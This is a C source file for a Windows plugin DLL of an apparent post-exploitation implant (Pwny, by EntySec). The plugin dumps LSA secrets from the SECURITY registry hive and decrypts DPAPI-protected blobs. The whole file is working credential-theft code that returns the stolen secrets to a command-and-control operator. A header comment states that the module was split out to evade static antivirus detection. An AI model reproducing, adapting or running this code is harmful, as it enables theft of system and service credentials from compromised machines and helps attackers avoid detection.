/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * LSA Secrets tab plugin — dump LSA secrets and DPAPI decryption.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS
#include <ntsecapi.h>
#include <dpapi.h>
#include <pwny/c2.h>
#include <pwny/log.h>
#include <pwny/misc.h>

#define LSA_SECRETS_BASE 32

#define LSA_SECRETS_DUMP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       LSA_SECRETS_BASE, \
                       API_CALL)

#define LSA_DPAPI_DECRYPT \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       LSA_SECRETS_BASE, \
                       API_CALL + 1)

#define LSA_SECRETS_TYPE_NAME   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LSA_SECRETS_BASE, API_TYPE)
#define LSA_SECRETS_TYPE_DATA   TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, LSA_SECRETS_BASE, API_TYPE)
#define LSA_DPAPI_TYPE_INPUT    TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, LSA_SECRETS_BASE, API_TYPE + 1)
#define LSA_DPAPI_TYPE_OUTPUT   TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, LSA_SECRETS_BASE, API_TYPE + 2)
#define LSA_DPAPI_TYPE_ENTROPY  TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, LSA_SECRETS_BASE, API_TYPE + 3)

/*
 * Dump all LSA secrets.
 * Requires SYSTEM privileges to open HKLM\SECURITY and call LsaRetrievePrivateData.
 */

static tlv_pkt_t *lsa_secrets_dump(c2_t *c2)
{
    LSA_OBJECT_ATTRIBUTES oa;
    LSA_HANDLE hPolicy = NULL;
    NTSTATUS status;

    HKEY hSecrets = NULL;
    DWORD idx;
    DWORD nameLen;
    wchar_t nameBuf[256];

    tlv_pkt_t *result;

    memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);

    status = LsaOpenPolicy(NULL, &oa,
                           POLICY_GET_PRIVATE_INFORMATION,
                           &hPolicy);

    if (status != 0)
    {
        log_debug("* lsa_secrets: LsaOpenPolicy failed (0x%lx)\n",
                  (unsigned long)status);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Enumerate secret names from the registry */
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SECURITY\\Policy\\Secrets",
                      0, KEY_ENUMERATE_SUB_KEYS,
                      &hSecrets) != ERROR_SUCCESS)
    {
        log_debug("* lsa_secrets: cannot open Secrets registry key\n");
        LsaClose(hPolicy);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    for (idx = 0; ; idx++)
    {
        LSA_UNICODE_STRING keyName;
        PLSA_UNICODE_STRING privateData = NULL;
        tlv_pkt_t *entry;
        char name_utf8[512];
        int len;

        nameLen = 256;
        if (RegEnumKeyExW(hSecrets, idx, nameBuf,
                          &nameLen, NULL, NULL, NULL,
                          NULL) != ERROR_SUCCESS)
        {
            break;
        }

        keyName.Buffer = nameBuf;
        keyName.Length = (USHORT)(nameLen * sizeof(wchar_t));
        keyName.MaximumLength = (USHORT)((nameLen + 1) * sizeof(wchar_t));

        status = LsaRetrievePrivateData(hPolicy, &keyName, &privateData);

        entry = tlv_pkt_create();

        /* Convert name to UTF-8 */
        len = WideCharToMultiByte(CP_UTF8, 0, nameBuf, nameLen,
                                  name_utf8, sizeof(name_utf8) - 1,
                                  NULL, NULL);
        if (len > 0)
        {
            name_utf8[len] = '\0';
        }
        else
        {
            name_utf8[0] = '\0';
        }

        tlv_pkt_add_string(entry, LSA_SECRETS_TYPE_NAME, name_utf8);

        if (status == 0 && privateData != NULL &&
            privateData->Buffer != NULL && privateData->Length > 0)
        {
            tlv_pkt_add_bytes(entry, LSA_SECRETS_TYPE_DATA,
                              (unsigned char *)privateData->Buffer,
                              privateData->Length);
        }
        else
        {
            /* Empty data for secrets we can't read */
            tlv_pkt_add_bytes(entry, LSA_SECRETS_TYPE_DATA,
                              (unsigned char *)"", 0);
        }

        if (privateData != NULL)
        {
            LsaFreeMemory(privateData);
        }

        tlv_pkt_add_tlv(result, TLV_TYPE_GROUP, entry);
        tlv_pkt_destroy(entry);
    }

    RegCloseKey(hSecrets);
    LsaClose(hPolicy);

    return result;
}

/*
 * DPAPI: CryptUnprotectData on a supplied blob.
 * Optionally accepts entropy bytes.
 */

static tlv_pkt_t *lsa_dpapi_decrypt(c2_t *c2)
{
    unsigned char *input_buf = NULL;
    int input_len;

    unsigned char *entropy_buf = NULL;
    int entropy_len;

    DATA_BLOB dataIn;
    DATA_BLOB dataOut;
    DATA_BLOB optEntropy;
    DATA_BLOB *pEntropy = NULL;

    tlv_pkt_t *result;

    input_len = tlv_pkt_get_bytes(c2->request, LSA_DPAPI_TYPE_INPUT,
                                  &input_buf);
    if (input_len <= 0 || input_buf == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    dataIn.pbData = input_buf;
    dataIn.cbData = (DWORD)input_len;

    memset(&dataOut, 0, sizeof(dataOut));

    /* Optional entropy */
    entropy_len = tlv_pkt_get_bytes(c2->request, LSA_DPAPI_TYPE_ENTROPY,
                                    &entropy_buf);
    if (entropy_len > 0 && entropy_buf != NULL)
    {
        optEntropy.pbData = entropy_buf;
        optEntropy.cbData = (DWORD)entropy_len;
        pEntropy = &optEntropy;
    }

    if (!CryptUnprotectData(&dataIn, NULL, pEntropy,
                            NULL, NULL,
                            CRYPTPROTECT_UI_FORBIDDEN,
                            &dataOut))
    {
        log_debug("* dpapi: CryptUnprotectData failed (%lu)\n",
                  GetLastError());
        free(input_buf);
        if (entropy_buf)
        {
            free(entropy_buf);
        }
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);

    if (dataOut.pbData != NULL && dataOut.cbData > 0)
    {
        tlv_pkt_add_bytes(result, LSA_DPAPI_TYPE_OUTPUT,
                          dataOut.pbData, dataOut.cbData);
    }

    LocalFree(dataOut.pbData);

    free(input_buf);
    if (entropy_buf)
    {
        free(entropy_buf);
    }

    return result;
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, LSA_SECRETS_DUMP, (api_t)lsa_secrets_dump);
    api_call_register(api_calls, LSA_DPAPI_DECRYPT, (api_t)lsa_dpapi_decrypt);
}

#endif
